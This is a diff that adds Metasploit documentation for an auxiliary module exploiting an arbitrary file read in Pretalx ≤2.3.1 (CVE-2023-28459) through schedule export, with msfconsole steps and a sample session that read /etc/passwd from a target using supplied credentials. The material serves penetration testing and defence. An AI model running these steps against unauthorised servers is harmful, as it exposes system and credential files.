@@ -1,44 +1,55 @@
-The following is the recommended format for module documentation. But feel free to add more content/sections to this.
-One of the general ideas behind these documents is to help someone troubleshoot the module if it were to stop
-functioning in 5+ years, so giving links or specific examples can be VERY helpful.
+## Description
+
+This module exploits functionality in Pretalx that export conference schedule as zipped file. The Pretalx will iteratively include any file referenced by any HTML tag and does not properly check the path of the file, which can lead to arbitrary file read. The module requires crendetials that allow schedule export, schedule release and approval of proposals. Additionaly, module requires conference name and URL for media files.
 
 ## Vulnerable Application
+Pretalx is an open-source conference scheduling tool that allows organizers to manage event schedules, speakers, and submissions.
 
-Instructions to get the vulnerable application. If applicable, include links to the vulnerable install
-files, as well as instructions on installing/configuring the environment if it is different than a
-standard install. Much of this will come from the PR, and can be copy/pasted.
+The vulnerability exploited by this module exists in Pretalx versions up to 2.3.1, where the export functionality of conference schedules as zipped files improperly handles paths in HTML tags. This allows an authenticated user with proper permissions to read arbitrary files on the server by referencing them in exported schedules.
+
+Vulnerable versions: Pretalx ≤ 2.3.1
+
+Vulnerability: Arbitrary file read through schedule export
+
+Source code: https://github.com/pretalx/pretalx
+
+Exploit requires: Valid credentials with permissions to export schedules, release schedules, and approve proposals.
+
+More info: CVE-2023-28459
 
 ## Verification Steps
-Example steps in this format (is also in the PR):
+1. Install a vulnerable Pretalx instance (version ≤ 2.3.1). You can follow the official installation guide: https://docs.pretalx.org/en/latest/install/
 
-1. Install the application
-1. Start msfconsole
-1. Do: `use [module path]`
-1. Do: `run`
-1. You should get a shell.
+2. Start msfconsole.
 
-## Options
-List each option and how to use it.
+3. Load the module with:
 
-### Option Name
-
-Talk about what it does, and how to use it appropriately. If the default value is likely to change, include the default value here.
+```
+use auxiliary/scanner/http/pretalx_file_read
+```
+4. Set required options:
+```
+set RHOSTS <target_ip>
+set USERNAME <valid_username>
+set PASSWORD <valid_password>
+set CONFERENCE_NAME <conference_slug>
+set FILEPATH /etc/passwd
+set MEDIA_URL /media
+```
+5. Run the module:
+```
+run
+```
+On success, the module will store the contents of the targeted file as loot.
 
 ## Scenarios
-Specific demo of using the module that might be useful in a real world scenario.
-
-### Version and OS
-
 ```
-code or console output
-```
-
-For example:
-
-To do this specific thing, here's how you do it:
-
-```
-msf > use module_name
-msf auxiliary(module_name) > set POWERLEVEL >9000
-msf auxiliary(module_name) > exploit
+msf6 > use auxiliary/scanner/http/pretalx_file_read
+msf6 auxiliary(scanner/http/pretalx_file_read) > set RHOSTS 192.168.1.10
+msf6 auxiliary(scanner/http/pretalx_file_read) > set USERNAME admin
+msf6 auxiliary(scanner/http/pretalx_file_read) > set PASSWORD password123
+msf6 auxiliary(scanner/http/pretalx_file_read) > set CONFERENCE_NAME myconf
+msf6 auxiliary(scanner/http/pretalx_file_read) > set FILEPATH /etc/passwd
+msf6 auxiliary(scanner/http/pretalx_file_read) > run
+[+] Stored results in /path/to/.msf4/loot/...
 ```
